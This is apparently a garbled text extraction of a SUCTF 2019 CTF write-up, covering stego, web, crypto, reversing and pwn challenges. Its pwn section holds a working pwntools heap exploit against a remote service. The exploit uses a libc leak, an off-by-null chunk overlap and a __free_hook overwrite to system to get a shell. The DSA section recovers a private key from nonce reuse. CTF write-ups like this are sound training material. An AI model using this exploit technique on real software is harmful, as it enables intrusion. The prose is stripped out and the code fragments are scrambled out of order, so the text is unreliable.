27
28
29
30
31
32
33
34
35
36
https://github.com/summershrimp/opendeck-
gui/blob/7a459166dfc664291d49525eb1a362377ed5b6c9/lv_app/opendeck_app.c 
key_statusﬂag
Game
Status: solved
Tags: Misc
Githubdiﬀthree.min.jsvar acd= 
mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png; b1,rgb,lsb,xybase64
3deshtmlﬂag
Status: solved
Tags: Misc
base64pngﬂag
Status: solved
Tags: Pwn
old pc, old method.
nc 47.111.59.243 10001
  1
 1
add_name oﬀ-by-null32bit
 libc
flag.save('flag.png')
37
echo "U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==" |openssl 
enc -des3 -d -base64 -k "suctf{hAHaha_Fak3_F1ag}"
1
#!python
#-*- coding: utf-8 -*-
#@Date: 2019-08-17 16:42:47
from pwn import *
menu = lambda x: p.sendlineafter(">>> ",str(x))
1
2
3
4
5
6
ru = lambda x: p.recvuntil(x,drop=True)
r = lambda x: p.recv(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
# p = process('./oldpc')
p = remote("47.111.59.243",10001)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF("./libc.so")
libc = ELF("./libc.6")
def purchase(l,name,price):
    menu(1)
    ru("Name length: ")
    sl(str(l))
    ru("Name: ")
    s(name)
    ru("Price: ")
    sl(str(price))
def comment(idx,com,score,r=False):
    menu(2)
    ru("Index: ")
    sl(str(idx))
    if r:
        pass
    s(com)
    ru("And its score: ")
    sl(str(score))
def throw(idx,r=False):
    menu(3)
    ru("index: ")
    sl(str(idx))
    if r:
        pass
def rename(idx,name,cnt):
    menu(4)
    ru("index: ")
    sl(str(idx))
    s(name)
    ru('power?(y/n)')
    sl('y')
    ru('serial: ')
    sl('e4SyD1C!')
    ru("Pwner")
    sl(cnt)
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
#leaking libc
purchase(0x10, '0\n', 0)
comment(0, 'a\n', 0)
purchase(0x10, '1\n', 1)
throw(0)
purchase(0x10, '0\n', 0)
comment(0, 'a', 0)
throw(0)
ru('Comment ')
libc.address = u32(r(4))-((libc.sym["__malloc_hook"]&0xffffff00)+0x61)
# libc.address = u32(r(4))-0x1b2761
#libc.address = u32(r(4))-libc.sym["__malloc_hook"]
log.info("libc.address:"+hex(libc.address))
__free_hook = libc.sym['__free_hook']
log.info("__free_hook:"+hex(__free_hook))
system = libc.sym['system']
log.info("system:"+hex(system))
throw(1)
# overlap
purchase(0x10,'000\n',0)
purchase(0x10,'111\n',1)
purchase(0x10,'222\n',2)
purchase(0x10,'333\n',3)
throw(0)
throw(1)
throw(2)
throw(3)
purchase(0x34,'000\n',0)
purchase(0x104,"1"*0xf8+p32(0x100)+'\n',1)
purchase(0x8c,'222\n',2)
throw(0)
throw(1)
#off-by-null
purchase(0x34,'/bin/sh\x00'.ljust(0x34,'0'),0)
purchase(0x40,'111\n',1)
purchase(0x18,'333\n',3)
throw(1)
throw(2)
purchase(0x58,'/bin/sh\x00\n',1)
purchase(0x28,'/bin/sh\x00\n',2)
purchase(0x200,'2\n',2)
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
Pythonginx
Status: solved
Tags: Web
https://www.blackhat.com/us-19/brieﬁngs/schedule/#hostsplit-exploitable-antipatterns-in-
unicode-normalization-14786ppt
unicodeifhost suctf.cc 
suctf.cc127.0.0.1
rename(4,"\x00"*0x6c+p32(__free_hook),p32(system))
p.interactive()
105
106
107
http://www.unicode.org/cldr/utility/list-unicodeset.jsp?a=[:script=common:] c
unicode
DSA
Status: solved
Tags: Crypto
:https://www.cnblogs.com/Higgerw/p/10301482.html
p = 
89884656743115795739678354382708811898612660822368092344567427388259901353
56892470345107998992990871781314179509322146805639362260448544265893607609
27477661134167622913227944248570006423414014352981962448387096113583572271
30567408679059995300726314962982581144329690825930952807605482666470568898
892470947889
g = 
23362397837988665661962706184444314399371209826702448484412882128184181932
60908211774631416174402263956848375085099560328603124641488555552869325397
22544567925041841627677640426195462221869929632616752684975591035928441865
84502751982840228444031824658955646050635021674342004030327085676068388633
575869096267
s1 = 816356642413846944684989243155506908429458808084L
s2 = 276664403166730631514824875934712175401651747908L
r = 528964267437397097267962985526284842916097680261L
q = 918152883769584503088536070090092114051068163327
m1 = 45191349756339761230969331730882567310
m2 = 307693878875281197163704550997724119116
inv_s1 = power_mod(s1,-1,q)
inv_s2 = power_mod(s2,-1,q)
a = m1*inv_s1 - m2*inv_s2
b = inv_s2-inv_s1
inv_r = power_mod(r,-1,q)
inv_b = power_mod(b,-1,q)
x = inv_r*inv_b*a
x %= q
k = power_mod(1,-1,q)
r = (power_mod(g,k,p))%q
m = 334436397493699539473999398012751306876
s = (x*r+m)
s %= q
print r,',',s
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
Akira Homework
Status: solved
Tags: Reverse
,,0000000140015F20xor_key,
xor_key,:->md5->dll
dll,,,key,
,dll,dll
dll,AES,keyAk1i3aS3cre7K3y,ShareMemory,,
ﬂag{Ak1rAWin!}
Signin
Status: solved
Tags: Reverse
RSA
n factordb
# flag{Wh4t_a_Prety_Si3nature!}
23
24